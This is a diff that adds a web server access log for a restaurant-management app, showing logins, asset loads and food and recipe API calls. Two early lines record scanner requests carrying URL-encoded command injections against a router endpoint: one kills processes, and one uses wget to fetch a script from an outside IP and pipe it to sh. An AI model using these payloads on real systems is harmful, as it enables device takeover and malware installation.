@@ -1,0 +1,1154 @@
+INFO:     127.0.0.1:44848 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44854 - "GET /_next/static/j2mtjWhkpg__ofqi0UofF/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51632 - "GET /_next/static/j2mtjWhkpg__ofqi0UofF/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45650 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45660 - "GET /_next/static/UnGqHpUJGyX2QgfJbh3gR/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45662 - "GET /_next/static/UnGqHpUJGyX2QgfJbh3gR/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47534 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50396 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50410 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50422 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38400 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38412 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38418 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55788 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55794 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55804 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39970 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32964 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:32976 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:32982 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56968 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34360 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34366 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45142 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44802 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44808 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44822 - "GET /_next/static/yQGBM2WerDCIgvDb_oHuZ/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52356 - "OPTIONS /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58220 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58236 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46484 - "GET /_next/static/chunks/pages/_app-4ac3c5f6d6e069e4.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46496 - "GET /_next/static/tReBU-vkqlDOtORliJ1Bz/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46508 - "GET /_next/static/tReBU-vkqlDOtORliJ1Bz/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57620 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33966 - "GET /_next/static/chunks/pages/_app-4ac3c5f6d6e069e4.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33972 - "GET /_next/static/tReBU-vkqlDOtORliJ1Bz/_buildManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33986 - "GET /_next/static/tReBU-vkqlDOtORliJ1Bz/_ssgManifest.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52560 - "GET /_next/static/tReBU-vkqlDOtORliJ1Bz/_buildManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52558 - "GET /_next/static/chunks/pages/_app-4ac3c5f6d6e069e4.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52564 - "GET /_next/static/tReBU-vkqlDOtORliJ1Bz/_ssgManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52588 - "GET /_next/static/chunks/pages/V1/RestaurantSignUpPage-51be41ac8631d05d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52578 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52596 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37888 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37892 - "GET /_next/static/chunks/pages/V1/RestaurantImagePage-04c3f3a7ac4ecec6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37908 - "GET /punjabi.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37914 - "GET /g.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37918 - "GET /z.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37924 - "GET /s.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34732 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34736 - "GET /_next/static/chunks/pages/V1/RestaurantImagePage-04c3f3a7ac4ecec6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34750 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34762 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34770 - "GET /g.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34776 - "GET /z.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34778 - "GET /s.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34788 - "GET /punjabi.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33006 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33022 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33052 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33064 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33068 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33082 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33086 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33096 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33104 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33108 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33110 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33116 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33120 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33136 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33154 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33164 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33184 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33194 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33198 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41840 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41844 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41858 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41864 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41880 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41892 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54942 - "POST /food/addFoodItem HTTP/1.1" 500 Internal Server Error
+INFO:     127.0.0.1:54952 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54956 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54966 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60434 - "POST /food/addFoodItem HTTP/1.1" 500 Internal Server Error
+INFO:     127.0.0.1:60444 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60450 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60462 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53414 - "OPTIONS /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35990 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36002 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36008 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36012 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36020 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:36024 - "GET /_next/static/chunks/pages/V1/RestaurantSignUpPage-51be41ac8631d05d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56716 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56726 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56732 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56748 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56760 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56772 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56788 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56794 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56802 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56812 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56820 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56828 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56844 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56852 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56864 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56874 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56886 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56888 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56890 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:56898 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56904 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56920 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56934 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56948 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36088 - "POST /food/addFoodItem HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36102 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36108 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36124 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36138 - "GET /food/getRawMaterialsForFood/37 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36144 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57330 - "POST /food/addRawMaterialsObjForFood HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57342 - "GET /food/getRawMaterialsForFood/37 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57358 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38932 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:38948 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:38964 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:38982 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:38970 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:38998 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:38992 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39000 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39010 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39016 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39024 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39032 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39038 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39062 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39070 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39082 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39084 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39048 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39100 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39108 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:39086 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39116 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39126 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39130 - "GET /food/getRawMaterialsForFood/37 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39146 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53594 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:53596 - "GET /review/reviewsByRestaurantId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53602 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45900 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45912 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45924 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45926 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45928 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45942 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50024 - "POST /foodRecipeSteps/recipe_steps HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50034 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50038 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:36102 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36118 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36120 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36124 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36140 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36144 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36146 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36162 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36166 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36174 - "GET /foodRecipeSteps/recipe_steps/37 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37052 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:37064 - "GET /_next/static/chunks/pages/V1/RestaurantSignUpPage-51be41ac8631d05d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:37072 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:37088 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:37096 - "POST /restaurantUser/restaurant_signup HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51552 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51568 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51576 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51590 - "GET /_next/static/chunks/pages/V1/RestaurantImagePage-04c3f3a7ac4ecec6.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:51594 - "GET /punjabi.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51606 - "GET /g.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51620 - "GET /z.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51622 - "GET /s.svg HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47802 - "POST /restaurant/add_restaurant HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47808 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47816 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47822 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47838 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47848 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47866 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47864 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47872 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47874 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47886 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47902 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47910 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:47916 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:58984 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:58998 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:59000 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:59010 - "GET /_next/static/chunks/pages/V1/Recipe-d04657f0002f6255.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:59020 - "GET /_next/static/chunks/pages/_error-77823ddac6993d35.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59026 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59040 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59056 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59060 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59074 - "GET /food/getAllFoodItemsByRestaurant/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59088 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47946 - "POST /food/addFoodItem HTTP/1.1" 500 Internal Server Error
+INFO:     127.0.0.1:47962 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47972 - "GET /food/getAllFoodItemsByRestaurant/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47974 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57784 - "POST /food/addFoodItem HTTP/1.1" 500 Internal Server Error
+INFO:     127.0.0.1:57786 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57796 - "GET /food/getAllFoodItemsByRestaurant/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57812 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42322 - "POST /food/addFoodItem HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42326 - "GET /restaurant/getRestaurantByUserId/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42338 - "GET /food/getAllFoodItemsByRestaurant/12 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42346 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42632 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42640 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42654 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42670 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42682 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42692 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42708 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42718 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 304 Not Modified
+INFO:     127.0.0.1:42730 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 304 Not Modified
